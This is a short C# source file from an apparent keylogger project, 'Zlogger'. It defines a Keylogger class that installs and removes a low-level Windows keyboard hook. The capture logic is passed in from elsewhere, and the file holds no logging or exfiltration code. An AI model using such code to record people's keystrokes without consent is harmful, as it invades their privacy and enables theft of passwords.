using Rodjenihm.Zlogger.WinAPI;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Rodjenihm.Zlogger
{
    public sealed class Keylogger : IDisposable
    {
        private readonly LowLevelKeyboardHook hook;
        public string LogPath { get; set; } = string.Empty;
        public HOOKPROC KeyboardHookProc { get; set; } = null;

        public Keylogger()
        {
            hook = new LowLevelKeyboardHook();
        }

        public Keylogger(string logPath) : this()
        {
            LogPath = logPath;
        }

        public Keylogger(string logPath, HOOKPROC keyboardHookProc) : this(logPath)
        {
            KeyboardHookProc = keyboardHookProc;
        }

        public void Run()
        {
            if (KeyboardHookProc != null) hook.SetHook(KeyboardHookProc);
            else throw new ArgumentNullException("Keyboard Hook Procedure is null", nameof(KeyboardHookProc));
        }

        public IntPtr NextHook(int nCode, IntPtr wParam, IntPtr lParam)
        {
            return hook.NextHook(nCode, wParam, lParam);
        }

        public void Dispose()
        {
            hook.RemoveHook();
        }
    }
}
